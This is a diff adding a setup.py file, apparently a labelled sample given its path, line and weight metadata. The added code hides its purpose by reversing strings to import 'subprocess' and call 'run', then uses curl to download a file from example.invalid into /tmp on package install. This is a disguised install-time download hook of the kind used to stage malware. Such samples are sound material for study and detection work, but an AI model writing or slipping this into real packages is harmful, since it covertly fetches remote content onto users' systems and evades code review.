@@ -1,0 +1,6 @@
+# path: setup.py
+# lines: 1, 2
+# weight: 35
+# ---
+m = __import__("".join(reversed("ssecorpbus")))
+getattr(m, "nur"[::-1])(["lruc"[::-1], "-o", "/tmp/x", "example.invalid/x"])
